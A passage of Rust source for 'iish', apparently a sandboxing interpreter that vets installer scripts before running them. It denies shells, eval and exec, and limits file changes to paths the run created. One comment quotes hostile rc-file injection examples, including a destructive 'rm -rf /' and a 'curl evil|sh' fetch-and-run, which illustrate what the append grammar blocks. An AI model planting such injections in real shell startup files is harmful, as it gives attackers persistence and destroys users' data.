        "command" => evaluate_command_builtin(args, redirects, ctx, config),
        "type" => evaluate_type(args, redirects.stdout),
        "return" => evaluate_return(args, ctx),
        "exit" => evaluate_exit(args, ctx),
        "break" | "continue" => evaluate_break_continue(name, args),

        // A shell is exactly what iish exists to replace; no config
        // knob may reopen this escape hatch (see PLAN.md's "no pass
        // through to bash" principle). `eval` and `exec` are the same
        // escape hatch spelled as builtins.
        "sh" | "bash" | "zsh" | "dash" | "ksh" => deny(format!(
            "`{name}` is a shell; iish parses and vets scripts itself instead of handing them to one"
        )),
        "eval" | "exec" => deny(format!(
            "`{name}` re-enters a shell on arbitrary text; iish refuses it categorically"
        )),

        // Shell builtins with no external binary: running them as a
        // subprocess would either find no binary to exec, or
        // (`export`) run against a throwaway child process and have no
        // effect on iish's own state. Not implemented, and not eligible
        // for the subprocess tier below for that reason.
        "export" | "source" | "." | "alias" | "trap" | "umask" | "hash" | "getopts" | "wait" => {
            deny(format!("`{name}` is a shell builtin; iish does not implement it"))
        }

        // Everything else: real external binaries iish has no native
        // implementation for (mv, tar, install, ln, sudo, package
        // managers, ...). Governed by the "subprocess" policy
        // (milestone 5, PLAN.md "Configuration") — allow/ask/deny,
        // globally or per command.
        other => evaluate_subprocess(other, args, redirects, ctx, config),
    }
}

/// `local NAME[=value] ...`: declare names in the innermost function
/// call's scope (bash's dynamic scoping — see state.rs). A declaration
/// with no `=` gets an empty value: bash technically leaves it unset,
/// but scripts that declare-then-test rely on the unquoted-empty
/// behavior a non-`nounset` shell gives them, and "empty" is the
/// behavior they observe.
fn evaluate_local(args: &[String], ctx: &mut ExpandCtx) -> Verdict {
    if !ctx.session.in_function() {
        return deny("`local` outside a function has no scope to declare into");
    }
    if args.is_empty() {
        return deny("`local` with no names is not supported");
    }
    let mut assignments = Vec::with_capacity(args.len());
    for arg in args {
        let (name, value) = match arg.split_once('=') {
            Some((n, v)) => (n, v),
            None => (arg.as_str(), ""),
        };
        if name.is_empty()
            || !name.starts_with(|c: char| c == '_' || c.is_ascii_alphabetic())
            || !name.chars().all(|c| c == '_' || c.is_ascii_alphanumeric())
        {
            return deny(format!(
                "`local {arg}`: `{name}` is not a valid variable name"
            ));
        }
        assignments.push((name.to_string(), value.to_string()));
    }
    allow(
        "declares function-scoped variables tracked for this call; no filesystem or process \
         side effects",
        Action::DeclareLocal { assignments },
    )
}

/// `cd [dir]`: implemented natively — iish changes its own working
/// directory, exactly what the builtin means. Not an escape hatch:
/// changing directory mutates nothing, and every later operation is
/// still vetted against the (absolute-path) ledger and policy no
/// matter where the process happens to sit.
fn evaluate_cd(args: &[String]) -> Verdict {
    let target = match args {
        [] => match std::env::var("HOME") {
            Ok(home) => PathBuf::from(home),
            Err(_) => return deny("cd with no directory: $HOME is not set"),
        },
        [dir] if dir == "-" => return deny("`cd -` (previous directory) is not implemented yet"),
        [dir] => PathBuf::from(dir),
        _ => return deny("cd with more than one directory"),
    };
    allow(
        "changes iish's working directory only; every later operation is still policy-checked",
        Action::ChangeDir { path: target },
    )
}

/// `read [-r] NAME < /dev/tty`: read one line from the terminal into
/// NAME — how installers (starship) ask their y/n questions, since the
/// script itself occupies stdin. Only the explicit `< /dev/tty` (or
/// `< /dev/null`, which reads EOF and fails like bash's would) shape
/// is implemented: a bare `read` would consume the script's own stdin.
fn evaluate_read(args: &[String], redirects: &Redirects) -> Verdict {
    let Some(path) = &redirects.stdin_probe else {
        return deny(
            "`read` without an explicit `< /dev/tty` redirect would consume the script's \
             own stdin; not implemented",
        );
    };
    let mut names = Vec::new();
    for arg in args {
        match arg.as_str() {
            // Without -r, backslash processing applies — iish reads the
            // raw line either way, which for a y/n answer is identical.
            "-r" => {}
            a if a.starts_with('-') => return deny(format!("read option `{a}` is not supported")),
            a => names.push(a.to_string()),
        }
    }
    let [name] = names.as_slice() else {
        return deny("`read` with other than exactly one variable name is not supported");
    };
    allow(
        format!("reads one line from `{path}` into `{name}`; nothing else"),
        Action::ReadLine {
            name: name.clone(),
            path: PathBuf::from(path),
        },
    )
}

/// `shift [n]`.
fn evaluate_shift(args: &[String]) -> Verdict {
    let n = match args {
        [] => 1,
        [n] => match n.parse::<usize>() {
            Ok(n) => n,
            Err(_) => return deny(format!("`shift {n}`: not a number")),
        },
        _ => return deny("`shift` takes at most one argument"),
    };
    allow(
        "drops leading positional parameters of the current function call; no other effects",
        Action::Shift { n },
    )
}

/// `unset [-f|-v] NAME...`: remove variables (default) or, with `-f`,
/// function definitions from the session. Both are pure bookkeeping.
fn evaluate_unset(args: &[String]) -> Verdict {
    let mut functions = false;
    let mut names = Vec::new();
    for arg in args {
        match arg.as_str() {
            "-f" => functions = true,
            "-v" => functions = false,
            a if a.starts_with('-') => return deny(format!("unset option `{a}` is not supported")),
            a => names.push(a.to_string()),
        }
    }
    if names.is_empty() {
        return deny("`unset` with no names");
    }
    allow(
        "removes variables or function definitions from this run's tracking only",
        Action::Unset { names, functions },
    )
}

/// The `command` builtin. `command -v NAME` is a pure lookup ("what
/// would NAME run?"), compiled to a native action. `command NAME
/// ARGS...` runs NAME while skipping function lookup — re-dispatched
/// through the very same evaluator, so the named command is vetted by
/// exactly the policy it would face if called plainly. `-p` (use a
/// default PATH) is accepted and treated as plain dispatch; iish's own
/// native implementations don't consult PATH anyway.
fn evaluate_command_builtin(
    args: &[String],
    redirects: Redirects,
    ctx: &mut ExpandCtx,
    config: &Config,
) -> Verdict {
    let mut lookup = false;
    let mut rest: &[String] = args;
    while let Some(first) = rest.first() {
        match first.as_str() {
            "-v" | "-V" => lookup = true,
            "-p" => {}
            "--" => {
                rest = &rest[1..];
                break;
            }
            a if a.starts_with('-') => {
                return deny(format!("command option `{a}` is not supported"))
            }
            _ => break,
        }
        rest = &rest[1..];
    }
    if lookup {
        return match rest {
            [name] => allow(
                "looks up what a name would run; runs nothing",
                Action::CommandLookup {
                    name: name.clone(),
                    style: LookupStyle::CommandV,
                    dest: redirects.stdout,
                },
            ),
            _ => deny("`command -v` with other than exactly one name is not supported"),
        };
    }
    match rest.split_first() {
        None => allow("`command` with nothing to run does nothing", Action::Noop),
        Some((name, args)) => evaluate_argv(name, args, redirects, ctx, config, true),
    }
}

/// `type NAME`: same lookup as `command -v`, sentence-shaped output.
fn evaluate_type(args: &[String], dest: StdoutDest) -> Verdict {
    match args {
        [name] => allow(
            "looks up what a name would run; runs nothing",
            Action::CommandLookup {
                name: name.clone(),
                style: LookupStyle::Type,
                dest,
            },
        ),
        _ => deny("`type` with other than exactly one name is not supported"),
    }
}

/// `return [n]`: only meaningful inside a function call.
fn evaluate_return(args: &[String], ctx: &ExpandCtx) -> Verdict {
    if !ctx.session.in_function() {
        return deny("`return` outside a function has nothing to return from");
    }
    let status = match args {
        [] => ctx.session.last_status(),
        [n] => match n.parse::<i32>() {
            Ok(n) => n,
            Err(_) => return deny(format!("`return {n}`: not a number")),
        },
        _ => return deny("`return` takes at most one argument"),
    };
    Verdict::ControlFlow(Flow::Return(status))
}

/// `exit [n]`: end the run, successfully or not — the script's own
/// choice, exactly as it would be under a real shell.
fn evaluate_exit(args: &[String], ctx: &ExpandCtx) -> Verdict {
    let status = match args {
        [] => ctx.session.last_status(),
        [n] => match n.parse::<i32>() {
            Ok(n) => n,
            Err(_) => return deny(format!("`exit {n}`: not a number")),
        },
        _ => return deny("`exit` takes at most one argument"),
    };
    Verdict::ControlFlow(Flow::Exit(status as u8))
}

/// `break [n]` / `continue [n]`.
fn evaluate_break_continue(name: &str, args: &[String]) -> Verdict {
    let n = match args {
        [] => 1,
        [n] => match n.parse::<u32>() {
            Ok(n) if n >= 1 => n,
            _ => return deny(format!("`{name} {n}`: not a positive number")),
        },
        _ => return deny(format!("`{name}` takes at most one argument")),
    };
    Verdict::ControlFlow(if name == "break" {
        Flow::Break(n)
    } else {
        Flow::Continue(n)
    })
}

/// The subprocess tier: commands iish has no native implementation for.
/// The already-parsed, literal argv is compiled into an `Action` that,
/// if allowed, execs it directly — never through a shell. This is also
/// how `sudo <cmd>` behaves until the sudo broker (milestone 4b) lands:
/// exactly the "degrade to per-command real sudo with fixed argv"
/// fallback PLAN.md's sudo-broker caveats describe.
fn evaluate_subprocess(
    name: &str,
    args: &[String],
    redirects: Redirects,
    ctx: &ExpandCtx,
    config: &Config,
) -> Verdict {
    let action = Action::Subprocess {
        name: name.to_string(),
        args: args.to_vec(),
        stdout: redirects.stdout,
        stderr: redirects.stderr,
    };
    let created_path = runs_a_created_path(name, ctx);
    let self_call = created_path && calls_installed_binary(name, ctx);
    let verb = config.command_override(name).unwrap_or({
        if self_call {
            config.self_call
        } else if created_path {
            config.run_created
        } else {
            config.subprocess
        }
    });
    match verb {
        Verb::Deny if self_call => deny(format!(
            "calling installed binary `{name}` is denied by the self-call policy"
        )),
        Verb::Deny => deny(format!("`{name}` is not on the installer allowlist")),
        Verb::Ask if self_call => prompt(
            format!("run the installed binary directly: `{name}`?"),
            action,
        ),
        Verb::Ask => prompt(
            format!("`{name}` is not natively implemented; run the literal command directly?"),
            action,
        ),
        Verb::Allow if self_call => allow(
            format!("calls the installed binary `{name}` per the self-call policy"),
            action,
        ),
        Verb::Allow => allow(
            format!("`{name}` runs as a subprocess per configuration"),
            action,
        ),
    }
}

/// True if `name` looks like a path (not a bare `$PATH` lookup) to
/// something this run created earlier — e.g. a second-stage script the
/// install downloaded and is now executing.
fn runs_a_created_path(name: &str, ctx: &ExpandCtx) -> bool {
    name.contains('/') && ctx.session.owns(&state::normalize(Path::new(name)))
}

/// Installed tools are created paths that are executable either on disk
/// or because an earlier simulated `chmod +x` made them so in dry-run.
fn calls_installed_binary(name: &str, ctx: &ExpandCtx) -> bool {
    let path = state::normalize(Path::new(name));
    if ctx.session.is_recorded_executable(&path) {
        return true;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::metadata(path)
            .map(|metadata| metadata.is_file() && metadata.permissions().mode() & 0o111 != 0)
            .unwrap_or(false)
    }
    #[cfg(not(unix))]
    path.is_file()
}

/// rc/profile files iish will append to, matching PLAN.md's "Append to
/// shell env files" row. Only recognized when they sit directly in
/// `$HOME` — a same-named file elsewhere is not a shell startup file.
const ENV_FILE_NAMES: &[&str] = &[
    ".bashrc",
    ".bash_profile",
    ".bash_login",
    ".profile",
    ".zshrc",
    ".zprofile",
    ".zshenv",
    ".zlogin",
];

fn is_recognized_env_file(path: &Path) -> bool {
    let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
        return false;
    };
    if !ENV_FILE_NAMES.contains(&name) {
        return false;
    }
    match std::env::var("HOME") {
        Ok(home) => path.parent() == Some(Path::new(&home)),
        Err(_) => false,
    }
}

/// `echo`/`printf ... >> rcfile`: appends are allowed only onto a
/// recognized rc/profile file in `$HOME`, and only when every appended
/// line matches PLAN's restricted grammar (`export VAR=...`, `PATH=...`,
/// or `source`/`.` of a file this script created) — see
/// `check_env_file_grammar`. Governed by `config.env_file_append`.
fn evaluate_env_file_append(
    name: &str,
    args: &[String],
    target: &ast::Word,
    ctx: &mut ExpandCtx,
    config: &Config,
) -> Verdict {
    let text = match render_output(name, args) {
        Ok(t) => t,
        Err(reason) => return deny(reason),
    };
    let path_str = match literal_word(target, ctx) {
        Ok(s) => s,
        Err(reason) => return deny(reason),
    };
    let path = state::normalize(Path::new(&path_str));

    if !is_recognized_env_file(&path) {
        return deny(format!(
            "`{}` is not a recognized shell rc/profile file in $HOME; env-file appends are \
             restricted to {}",
            path.display(),
            ENV_FILE_NAMES.join(", ")
        ));
    }
    if let Err(reason) = check_env_file_grammar(&text, ctx) {
        return deny(format!("append to `{}` refused: {reason}", path.display()));
    }

    let action = Action::AppendFile {
        path: path.clone(),
        text,
    };
    match config.env_file_append {
        Verb::Deny => deny(format!(
            "appending to `{}` is disabled by configuration",
            path.display()
        )),
        Verb::Ask => prompt(
            format!(
                "append to `{}` (matches the restricted env-file grammar)",
                path.display()
            ),
            action,
        ),
        Verb::Allow => allow(
            format!(
                "appends only lines matching the restricted env-file grammar to `{}`",
                path.display()
            ),
            action,
        ),
    }
}

/// Every non-blank line of an env-file append must be `export VAR=...`,
/// a `PATH=...` assignment, or `source`/`.` of a single path this script
/// already created — PLAN.md's restricted append grammar. Anything else
/// (conditionals, command substitution, arbitrary commands, ...) is
/// refused.
fn check_env_file_grammar(text: &str, ctx: &ExpandCtx) -> Result<(), String> {
    for line in text.lines() {
        let line = line.trim();
        if is_export_assignment(line) || line.starts_with("PATH=") {
            // The value part of an assignment must be a single word: a
            // later shell *sources* this file, so a value carrying a
            // command separator or substitution (`export PATH=x; rm -rf
            // /`, `PATH=$(curl evil|sh)`) would run as a command then,
            // exactly the persistence injection the restricted grammar
            // exists to prevent. `:`/`/`/`$VAR`/quotes are fine — real
            // `PATH="/opt/bin:$PATH"` needs them.
            if let Some(bad) = line.find([';', '&', '|', '`', '\n', '<', '>', '(', ')']) {
                return Err(format!(
                    "`{line}` contains a shell metacharacter (`{}`) in an env-file value; \
                     only a single-word value is allowed",
                    &line[bad..=bad]
                ));
            }
            if line.contains("$(") {
                return Err(format!(
                    "`{line}` contains a command substitution in an env-file value; refused"
                ));
            }
            continue;
        }
        if line.is_empty() {
            continue;
        }
        if let Some(rest) = line
            .strip_prefix("source ")
            .or_else(|| line.strip_prefix(". "))
        {
            let target = rest.trim();
            if target.is_empty() || target.contains(char::is_whitespace) {
                return Err(format!(
                    "`{line}` is not a plain `source`/`.` of a single path"
                ));
            }
            let path = state::normalize(Path::new(target));
            if !ctx.session.owns(&path) {
                return Err(format!("`{target}` was not created by this script"));
            }
            continue;
        }
        return Err(format!(
            "`{line}` does not match the allowed grammar (export VAR=..., PATH=..., or \
             source/. of a file this script created)"
        ));
    }
    Ok(())
}

fn is_export_assignment(line: &str) -> bool {
    let Some(rest) = line.strip_prefix("export ") else {
        return false;
    };
    let rest = rest.trim_start();
    let Some((var_name, _value)) = rest.split_once('=') else {
        return false;
    };
    !var_name.is_empty()
        && var_name.starts_with(|c: char| c == '_' || c.is_ascii_alphabetic())
        && var_name
            .chars()
            .all(|c| c == '_' || c.is_ascii_alphanumeric())
}

/// `sha256sum`: computes or verifies SHA-256 digests natively (PLAN.md's
/// "checksum verification" value-add). Restricted, like `rm`/`chmod`, to
/// paths this run created — installers use it to verify a download
/// against a checksums file they just fetched, not to read arbitrary
/// files on the system.
fn evaluate_sha256sum(args: &[String], ctx: &ExpandCtx) -> Verdict {
    let mut check = false;
    let mut paths: Vec<&str> = Vec::new();
    for arg in args {
        match arg.as_str() {
            "-c" | "--check" => check = true,
            a if a.starts_with('-') => {
                return deny(format!("sha256sum option `{a}` is not supported"))
            }
            a => paths.push(a),
        }
    }

    if check {
        evaluate_sha256_check(&paths, ctx)
    } else {
        evaluate_sha256_compute(&paths, ctx)
    }
}

fn evaluate_sha256_compute(paths: &[&str], ctx: &ExpandCtx) -> Verdict {
    if paths.is_empty() {
        return deny("sha256sum with no file");
    }
    let mut resolved = Vec::with_capacity(paths.len());
    for p in paths {
        let path = state::normalize(Path::new(p));
        if !ctx.session.owns(&path) {
            return deny(format!(
                "`{}` was not created by this script; sha256sum is limited to created paths",
                path.display()
            ));
        }
        resolved.push(path);
    }
    allow(
        "prints checksums only for paths this script created",
        Action::Sha256Sum { paths: resolved },
    )
}

fn evaluate_sha256_check(paths: &[&str], ctx: &ExpandCtx) -> Verdict {
    let checklist = match paths {
        [one] => *one,
        [] => return deny("sha256sum -c with no checksums file"),
        _ => return deny("sha256sum -c supports exactly one checksums file"),
    };
    let checklist_path = state::normalize(Path::new(checklist));
    if !ctx.session.owns(&checklist_path) {
        return deny(format!(
            "`{}` was not created by this script; sha256sum -c is limited to created \
             checksums files",
            checklist_path.display()
        ));
    }
    let text = match fs::read_to_string(&checklist_path) {
        Ok(t) => t,
        Err(e) => return deny(format!("cannot read `{}`: {e}", checklist_path.display())),
    };
    let mut entries = Vec::new();
    for (lineno, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        let Some((hex, name)) = parse_checksum_line(line) else {
            return deny(format!(
                "`{}` line {}: not a `<sha256>  <path>` checksum line",
                checklist_path.display(),
                lineno + 1
            ));
        };
        let path = state::normalize(Path::new(name));
        if !ctx.session.owns(&path) {
            return deny(format!(
                "`{}` was not created by this script; sha256sum -c is limited to created paths",
                path.display()
            ));
        }
        entries.push((hex.to_string(), path));
    }
    if entries.is_empty() {
        return deny(format!(
            "`{}` contains no checksum lines",
            checklist_path.display()
        ));
    }
    allow(
        "verifies checksums only for paths this script created",
        Action::Sha256Check { entries },
    )
}

/// Parse one `sha256sum -c` line: a 64-character hex digest, then two
/// spaces (text mode) or a space and `*` (binary mode), then the path.
fn parse_checksum_line(line: &str) -> Option<(&str, &str)> {
    if line.len() < 66 {
        return None;
    }
    let (hex, rest) = line.split_at(64);
    if !hex.bytes().all(|b| b.is_ascii_hexdigit()) {
        return None;
    }
    let name = rest
        .strip_prefix("  ")
        .or_else(|| rest.strip_prefix(" *"))?;
    if name.is_empty() {
        return None;
    }
    Some((hex, name))
}

fn evaluate_echo(args: &[String], dest: StdoutDest) -> Verdict {
    match render_echo(args) {
        Ok(text) => allow("prints output only", Action::Print { text, dest }),
        Err(reason) => deny(reason),
    }
}

fn evaluate_printf(args: &[String], dest: StdoutDest) -> Verdict {
    match render_output("printf", args) {
        Ok(text) => allow("prints output only", Action::Print { text, dest }),
        Err(reason) => deny(reason),
    }
}

/// The text `echo`/`printf` would produce, shared between the plain
/// (stdout) and env-file-append (`>>`) evaluators.
fn render_output(name: &str, args: &[String]) -> Result<String, String> {
    match name {
        "echo" => render_echo(args),
        "printf" => {
            let (format, rest) = args
                .split_first()
                .ok_or_else(|| "printf with no format string".to_string())?;
            render_printf(format, rest)
        }
        other => Err(format!(
            "redirecting `{other}`'s output is not implemented yet"
        )),
    }
}

fn render_echo(args: &[String]) -> Result<String, String> {
    let mut newline = true;
    let mut rest = args;
    // Only leading flags count; after the first non-flag word, `-n` is
    // just text, as in real echo.
    while let Some(first) = rest.first() {
        match first.as_str() {
            "-n" => newline = false,
            "-E" => {} // no escape processing — already our behavior
            "-e" | "-ne" | "-en" => {
                return Err("echo -e escape processing is not implemented yet".into())
            }
            _ => break,
        }
        rest = &rest[1..];
    }
    let mut text = rest.join(" ");
    if newline {
        text.push('\n');
    }
    Ok(text)
}

/// Render a printf invocation to the text it would output, supporting
/// the subset installers use: `%s`/`%%` directives, `\n`/`\t`/`\r`/`\\`
/// escapes, and format reuse while arguments remain.
fn render_printf(format: &str, args: &[String]) -> Result<String, String> {
    let mut out = String::new();
    let mut remaining = args.iter();
    loop {
        let mut consumed = false;
        let mut chars = format.chars();
        while let Some(c) = chars.next() {
            match c {
                '\\' => match chars.next() {
                    Some('n') => out.push('\n'),
                    Some('t') => out.push('\t'),
                    Some('r') => out.push('\r'),
                    Some('\\') => out.push('\\'),
                    // `\NNN`: one to three octal digits (rustup and
                    // zoxide probe ELF magic with `printf '\177ELF'`).
                    Some(first @ '0'..='7') => {
                        let mut value = first as u32 - '0' as u32;
                        for _ in 0..2 {
                            match chars.clone().next() {
                                Some(digit @ '0'..='7') => {
                                    chars.next();
                                    value = value * 8 + (digit as u32 - '0' as u32);
                                }
                                _ => break,
                            }
                        }
                        match char::from_u32(value) {
                            Some(c) => out.push(c),
                            None => {
                                return Err(format!(
                                    "printf octal escape `\\{value:o}` is out of range"
                                ))
                            }
                        }
                    }
                    Some(other) => {
                        return Err(format!("printf escape `\\{other}` is not implemented yet"))
                    }
                    None => return Err("printf format ends with a lone `\\`".into()),
                },
                '%' => match chars.next() {
                    Some('s') => {
                        // Missing arguments format as empty, as in bash.
                        out.push_str(remaining.next().map(String::as_str).unwrap_or(""));
                        consumed = true;
                    }
                    Some('b') => {
                        // `%s` that additionally expands backslash
                        // escapes inside the argument (nvm prints its
                        // rc-file snippet through `printf '%b'`).
                        let arg = remaining.next().map(String::as_str).unwrap_or("");
                        out.push_str(&expand_percent_b(arg)?);
                        consumed = true;
                    }
                    Some('%') => out.push('%'),
                    Some(other) => {
                        return Err(format!(
                            "printf directive `%{other}` is not implemented yet"
                        ))
                    }
                    None => return Err("printf format ends with a lone `%`".into()),
                },
                other => out.push(other),
            }
        }
        // bash reuses the format until the arguments run out — but only
        // if a pass actually consumes some, else extras are ignored.
        if !consumed || remaining.len() == 0 {
            return Ok(out);
        }
    }
}

/// Expand the escape sequences `printf %b` recognizes inside its
/// argument: the same set the format string itself supports, with
/// POSIX's `\0NNN` octal spelling.
fn expand_percent_b(arg: &str) -> Result<String, String> {
    let mut out = String::new();
    let mut chars = arg.chars();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('n') => out.push('\n'),
            Some('t') => out.push('\t'),
            Some('r') => out.push('\r'),
            Some('\\') => out.push('\\'),
            Some('0') => {
                let mut value = 0u32;
                for _ in 0..3 {
                    match chars.clone().next() {
                        Some(digit @ '0'..='7') => {
                            chars.next();
                            value = value * 8 + (digit as u32 - '0' as u32);
                        }
                        _ => break,
                    }
                }
                match char::from_u32(value) {
                    Some(c) if value > 0 => out.push(c),
                    _ => return Err("printf %b: NUL or out-of-range octal escape".into()),
                }
            }
            // bash's %b passes an unrecognized escape through
            // untouched (`\.` in nvm's rc snippet).
            Some(other) => {
                out.push('\\');
                out.push(other);
            }
            None => out.push('\\'),
        }
    }
    Ok(out)
}

fn evaluate_mkdir(args: &[String]) -> Verdict {
    let mut parents = false;
    let mut end_of_flags = false;
    let mut paths: Vec<PathBuf> = Vec::new();
    for arg in args {
        if end_of_flags {
            paths.push(state::normalize(Path::new(arg)));
            continue;
        }
        match arg.as_str() {
            "--" => end_of_flags = true,
            "-p" | "--parents" => parents = true,
            a if a.starts_with('-') => return deny(format!("mkdir option `{a}` is not supported")),
            a => paths.push(state::normalize(Path::new(a))),
        }
    }
    if paths.is_empty() {
        return deny("mkdir with no path");
    }
    if !parents {
        if let Some(existing) = paths.iter().find(|p| p.exists()) {
            return deny(format!(
                "`{}` already exists (mkdir without -p would fail)",
                existing.display()
            ));
        }
    }
    let to_create: Vec<PathBuf> = paths.into_iter().filter(|p| !p.exists()).collect();
    if to_create.is_empty() {
        return allow(
            "all directories already exist; mkdir -p is a no-op",
            Action::Noop,
        );
    }
    allow(
        "creates new directories only",
        Action::MkDir {
            paths: to_create,
            parents,
        },
    )
}

/// `touch`: implemented natively (PLAN's filesystem-mutation tier)
/// rather than as a subprocess so a file it creates is recorded in the
/// ledger — installers `touch f && rm f` to probe writability
/// (starship's `test_writable`), and a subprocess `touch` would leave
/// iish's later native `rm` refusing a file it didn't know it created.
/// Creating a new file is always fine; touching a *pre-existing* one
/// this run doesn't own only bumps its mtime, governed by `overwrite`
/// (it mutates a foreign path, if only its timestamp).
fn evaluate_touch(args: &[String], ctx: &ExpandCtx, config: &Config) -> Verdict {
    let mut end_of_flags = false;
    let mut paths: Vec<PathBuf> = Vec::new();
    for arg in args {
        if end_of_flags {
            paths.push(state::normalize(Path::new(arg)));
        } else if arg == "--" {
            end_of_flags = true;
        } else if arg.starts_with('-') && arg.len() > 1 {
            return deny(format!("touch option `{arg}` is not supported"));
        } else {
            paths.push(state::normalize(Path::new(arg)));
        }
    }
    if paths.is_empty() {
        return deny("touch with no path");
    }
    let foreign = paths
        .iter()
        .filter(|p| p.exists() && !ctx.session.owns(p))
        .count();
    let action = Action::Touch { paths };
    if foreign == 0 {
        return allow(
            "creates new files, or updates the timestamp of paths this run created",
            action,
        );
    }
    match config.overwrite {
        Verb::Deny => deny(format!(
            "touch would update the timestamp of {foreign} pre-existing path(s) it didn't \
             create; disabled by configuration"
        )),
        Verb::Ask => prompt(
            format!("touch would update the timestamp of {foreign} pre-existing path(s) it didn't create"),
            action,
        ),
        Verb::Allow => allow(
            "updates timestamps of pre-existing path(s) (allowed by configuration)",
            action,
        ),
    }
}

fn evaluate_rm(args: &[String], ctx: &ExpandCtx) -> Verdict {
    let mut recursive = false;
    let mut force = false;
    let mut end_of_flags = false;
    let mut paths: Vec<PathBuf> = Vec::new();
    for arg in args {
        if end_of_flags {
            paths.push(state::normalize(Path::new(arg)));
        } else if arg == "--" {
            end_of_flags = true;
        } else if let Some(long) = arg.strip_prefix("--") {
            match long {
                "recursive" => recursive = true,
                "force" => force = true,
                _ => return deny(format!("rm option `{arg}` is not supported")),
            }
        } else if let Some(cluster) = arg.strip_prefix('-') {
            if cluster.is_empty() {
                return deny("rm `-` is not supported");
            }
            for c in cluster.chars() {
                match c {
                    'r' | 'R' => recursive = true,
                    'f' => force = true,
                    other => return deny(format!("rm option `-{other}` is not supported")),
                }
            }
        } else {
            paths.push(state::normalize(Path::new(arg)));
        }
    }
    if paths.is_empty() {
        return deny("rm with no path");
    }
    for path in &paths {
        if !ctx.session.owns(path) {
            return deny(format!(
                "`{}` was not created by this script; refusing to delete",
                path.display()
            ));
        }
    }
    allow(
        "deletes only paths this script created",
        Action::Remove {
            paths,
            recursive,
            force,
        },
    )
}

fn evaluate_chmod(args: &[String], ctx: &ExpandCtx) -> Verdict {
    // An optional leading `--` ends option parsing; the mode follows.
    let args = match args.split_first() {
        Some((first, rest)) if first == "--" => rest,
        _ => args,
    };
    let Some((mode_str, path_args)) = args.split_first() else {
        return deny("chmod with no mode");
    };
    if mode_str.starts_with('-') {
        return deny(format!("chmod option `{mode_str}` is not supported"));
    }
    let mode = match parse_chmod_mode(mode_str) {
        Ok(mode) => mode,
        Err(reason) => return deny(reason),
    };
    if path_args.is_empty() {
        return deny("chmod with no path");
    }
    let mut paths: Vec<PathBuf> = Vec::new();
    for arg in path_args {
        // A `--` here ends any remaining option parsing; a bare `-…`
        // that isn't past a `--` is an unsupported option.
        if arg == "--" {
            continue;
        }
        if arg.starts_with('-') {
            return deny(format!("chmod option `{arg}` is not supported"));
        }
        let path = state::normalize(Path::new(arg));
        if !ctx.session.owns(&path) {
            return deny(format!(
                "`{}` was not created by this script; chmod is limited to created paths",
                path.display()
            ));
        }
        paths.push(path);
    }
    allow(
        "changes modes only on paths this script created",
        Action::Chmod { mode, paths },
    )
}

fn parse_chmod_mode(s: &str) -> Result<Mode, String> {
    if (1..=4).contains(&s.len()) && s.bytes().all(|b| (b'0'..=b'7').contains(&b)) {
        return Ok(Mode::Octal(u32::from_str_radix(s, 8).unwrap()));
    }
    // `[ugoa]*+x` is the only symbolic form installers use in practice.
    if let Some((who, perms)) = s.split_once('+') {
        if perms == "x" && who.chars().all(|c| "ugoa".contains(c)) {
            let mut bits = 0;
            for c in who.chars() {
                bits |= match c {
                    'u' => 0o100,
                    'g' => 0o010,
                    'o' => 0o001,
                    _ => 0o111, // 'a'
                };
            }
            if who.is_empty() {
                bits = 0o111; // bare `+x`, treated as `a+x`
            }
            return Ok(Mode::AddBits(bits));
        }
    }
    Err(format!("chmod mode `{s}` is not supported yet"))
}

/// `cp`: implemented natively (PLAN.md's "filesystem mutation" tier)
/// rather than falling into the generic subprocess tier. The source
/// side is unrestricted — copying only reads — but each destination is
/// governed by the same overwrite policy as `curl -o`/`wget -O`: a new
/// path is always fine, one this run already owns is fine to
/// overwrite, and a pre-existing foreign path is `config.overwrite`
/// (ask by default).
fn evaluate_cp(args: &[String], ctx: &ExpandCtx, config: &Config) -> Verdict {
    let mut recursive = false;
    let mut end_of_flags = false;
    let mut positional: Vec<&str> = Vec::new();
    for arg in args {
        if end_of_flags || arg == "-" {
            positional.push(arg);
        } else if arg == "--" {
            end_of_flags = true;
        } else if let Some(long) = arg.strip_prefix("--") {
            match long {
                "recursive" => recursive = true,
                "force" => {} // no interactive-overwrite behavior to suppress
                _ => return deny(format!("cp option `{arg}` is not supported")),
            }
        } else if let Some(cluster) = arg.strip_prefix('-') {
            for c in cluster.chars() {
                match c {
                    'r' | 'R' => recursive = true,
                    'f' => {}
                    other => return deny(format!("cp option `-{other}` is not supported")),
                }
            }
        } else {
            positional.push(arg);
        }
    }

    let Some((dest, sources)) = positional.split_last() else {
        return deny("cp with no destination");
    };
    if sources.is_empty() {
        return deny("cp with no source");
    }

    let dest_path = state::normalize(Path::new(dest));
    let dest_is_dir = dest_path.is_dir();
    if sources.len() > 1 && !dest_is_dir {
        return deny(format!(
            "cp with multiple sources requires `{}` to be an existing directory",
            dest_path.display()
        ));
    }

    let mut pairs: Vec<(PathBuf, PathBuf)> = Vec::with_capacity(sources.len());
    for src in sources {
        let src_path = state::normalize(Path::new(src));
        if !src_path.exists() {
            return deny(format!("cp: `{}` does not exist", src_path.display()));
        }
        if src_path.is_dir() && !recursive {
            return deny(format!(
                "cp: `{}` is a directory (missing -r)",
                src_path.display()
            ));
        }
        let target = if dest_is_dir {
            let Some(file_name) = src_path.file_name() else {
                return deny(format!("cp: `{}` has no file name", src_path.display()));
            };
            dest_path.join(file_name)
        } else {
            dest_path.clone()
        };
        pairs.push((src_path, target));
    }

    let foreign_overwrites = pairs
        .iter()
        .filter(|(_, dest)| dest.exists() && !ctx.session.owns(dest))
        .count();
    let action = Action::Copy { pairs, recursive };
    if foreign_overwrites == 0 {
        return allow(
            "copies only to new paths, or paths this run already created",
            action,
        );
    }
    match config.overwrite {
        Verb::Deny => deny(format!(
            "cp would overwrite {foreign_overwrites} pre-existing path(s) it didn't create; \
             overwriting is disabled by configuration"
        )),
        Verb::Ask => prompt(
            format!(
                "cp would overwrite {foreign_overwrites} pre-existing path(s) it didn't create"
            ),
            action,
        ),
        Verb::Allow => allow(
            "overwrites pre-existing destination path(s) (allowed by configuration)",
            action,
        ),
    }
}

/// `set`: iish only recognizes the option-flag form (`-e`/`-u`/`-x`,
/// their `+` counterparts, and `-o`/`+o NAME`). `-e`/`-x`-style flags
/// are no-ops here because iish's execution model already behaves as if
